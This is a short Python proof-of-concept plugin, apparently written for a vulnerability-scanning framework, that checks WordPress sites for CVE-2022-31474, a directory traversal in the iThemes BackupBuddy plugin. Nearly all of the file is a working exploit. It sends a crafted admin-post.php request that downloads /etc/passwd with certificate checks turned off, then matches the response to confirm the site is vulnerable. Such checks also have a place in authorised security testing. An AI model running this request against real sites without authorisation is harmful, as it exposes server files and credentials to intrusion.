#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31474',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'iThemes BackupBuddy 插件 8.5.8.0 - 8.7.4.1 版本中的目录遍历 CVE-2022-31474',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=wp-config&local-download=/etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret